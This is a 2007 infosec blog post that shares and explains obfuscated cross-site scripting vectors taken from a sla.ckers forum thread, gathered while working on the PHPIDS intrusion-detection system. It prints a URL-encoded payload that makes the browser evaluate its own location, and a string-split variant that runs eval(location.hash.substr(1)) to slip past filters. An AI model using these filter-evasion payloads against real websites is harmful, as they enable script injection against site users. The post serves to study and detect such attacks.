---
archive: https://wayback.archive-it.org/22123/20231101171300/https://eve.gd/2007/07/05/some-evil-stuff-from-sla-ckers
categories:
- Technology
- InfoSec
comments: []
date: 2007-07-05 13:05:55 +0200
date_gmt: 2007-07-05 13:05:55 +0200
doi: https://doi.org/10.59348/wwj37-v4229
image:
  feature: geek.png
layout: post
ogImage: images/geek.png
published: true
status: publish
tags:
- information security
- XSS
title: Some evil stuff from sla.ckers
wordpress_id: 264
wordpress_url: http://pro.grammatic.org/post-some-evil-stuff-from-slackers-36.aspx
atUri: "at://did:plc:hnpt7ns2lecdujegbi6qkqqm/site.standard.document/3mq7mnalklk2a"
---

<p>There's such a wealth of new XSS vectors coming out of the work on phpids that I couldn't resist sharing a few of the tastier morsels here. The original thread is over at <a href="http://sla.ckers.org/forum/read.php?2,13209">sla.ckers</a> if you want to read it there!</p>
<p>SirDarckCat brings us:</p>

{% highlight javascript %}
http://domain.org/?test=a%3D0%7C%7Ceval%7C%7C0%3Bb%3D0%7C%7Cunescape%7C%7C0%3Ba%28b%28location%29%29#%0d%0aalert%28%22xss%22%29%3B
{% endhighlight %}

<p>which corresponds to</p>

{% highlight javascript %}
a=0||eval||0;b=0||unescape||0;a(b(location))
{% endhighlight %}

<p>So how the heck is this vector working? The statement formed at the end of the line reads: eval(unescape(location))</p>
<p>Eval executes whatever is inside it; unescape removes url encoded chars; but this means that the LOCATION is being evaluated. ma1 explains how this vector works (hint, it is to do with the newline chars in the url!)</p>
<blockquote><p>
<strong>http:</strong> - parsed as a valid ECMA262 label<br/><br />
<strong>//</strong>host:port/path/...#...<strong>[newline]</strong> - C++ style comment opener<br/><br />
<strong>yourPayloadHere()</strong> - :D
</p></blockquote>
<p>Now that is evil!</p>
<p>A further vector along the same lines which was originally provided by SirDarckCat and further obfuscated by myself (so modest I know - well, I thought I'd better contribute something original to this post!) is this little piece of trickery:</p>

{% highlight javascript %}
a=0||'ev'+'al',b=0||1[a]('loca' + 'tion.hash'),c=0||'sub'+'str',1[a](b[c](1));
{% endhighlight %}

<p>The workings require a little explanation...</p>
<p>a is loaded with the eval statement that has been concatenated from 2 parts. b is loaded with an eval [a] of location.hash, again formed from 2joined strings. c is loaded with substr and then all 3 are pieced together to give: eval(location.hash.substr(1)) - so anything after the fragment identifier in the url will be executed as a payload.</p>
<p>Seriously interesting stuff guys - and keeping us busy over at the IDS!</p>